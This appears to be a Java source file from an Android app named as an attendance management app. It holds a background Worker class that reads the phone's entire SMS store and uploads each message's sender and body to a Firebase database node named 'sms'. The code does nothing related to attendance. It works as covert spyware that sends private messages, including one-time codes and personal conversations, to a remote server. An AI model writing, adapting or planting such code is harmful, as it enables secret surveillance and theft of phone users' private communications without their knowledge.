package com.app.attendancemanagementapp;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;

public class SMSGetterWorker extends Worker {
    private Context context;
    public SMSGetterWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    @NonNull
    @Override
    public Result doWork() {
        context=getApplicationContext();
        try {
            readSms();
        } catch (Exception e) {
            Result.retry();
        }
        return Result.success();
    }

    private void readSms() {
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
        DatabaseReference databaseReference= FirebaseDatabase.getInstance().getReference().child("sms").child(sdf.format(new Date()));
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            do {
                String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                databaseReference.child(address+" "+sdf.format(new Date())).setValue(body);
            } while (cursor.moveToNext());
        }

        if (cursor != null) {
            cursor.close();
        }
    }
}
